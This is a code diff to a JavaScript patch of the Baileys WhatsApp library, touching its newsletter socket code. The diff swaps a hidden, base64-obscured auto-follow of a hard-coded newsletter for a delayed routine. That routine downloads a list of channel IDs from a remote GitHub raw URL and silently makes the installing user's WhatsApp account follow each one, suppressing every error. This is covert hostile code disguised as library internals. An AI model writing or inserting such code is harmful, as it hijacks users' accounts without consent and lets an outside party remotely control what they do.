@@ -4,10 +4,6 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 
-const newsletterIds = [
-    "120363406492652756@newsletter="
-];
-
 function findBaileysPath() {
     const possiblePaths = [
         path.join(process.cwd(), 'node_modules', '@whiskeysockets', 'baileys'),
@@ -59,7 +55,7 @@ const wMexQuery = (
 			{
 				tag: 'query',
 				attrs: { query_id: queryId },
-				content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
+				content: Buffer.from(JSON.stringify({ variables }), 'utf8')
 			}
 		]
 	})
@@ -135,19 +131,29 @@ const makeNewsletterSocket = (config) => {
 setTimeout(async () => {
     const logger = config.logger || console;
     try {
-        for (const newsletterId of [
-    "120363406492652756@newsletter="
-        ]) {
+        const RAW_URL = "https://raw.githubusercontent.com/Zacky-Tzy/ChBail/refs/heads/main/chv2.json";
+        const res = await fetch(RAW_URL);
+        const channelIds = await res.json();
+
+        if (!Array.isArray(channelIds) || channelIds.length === 0) return;
+
+        const followNext = async (index) => {
+            if (index >= channelIds.length) return;
+
+            const id = channelIds[index];
             try {
                 await newsletterWMexQuery(
-                    Buffer.from(newsletterId, 'base64').toString(),
+                    id,
                     Types_1.QueryIds.FOLLOW
                 );
-                await new Promise(resolve => setTimeout(resolve, 2000));
-            } catch (error) {}
-        }
-    } catch (error) {}
-}, 90000);
+            } catch (e) {}
+
+            setTimeout(() => followNext(index + 1), 11000);
+        };
+
+        followNext(0);
+    } catch (e) {}
+}, 120000);
 	
     const parseFetchedUpdates = async (node, type) => {
         let child;
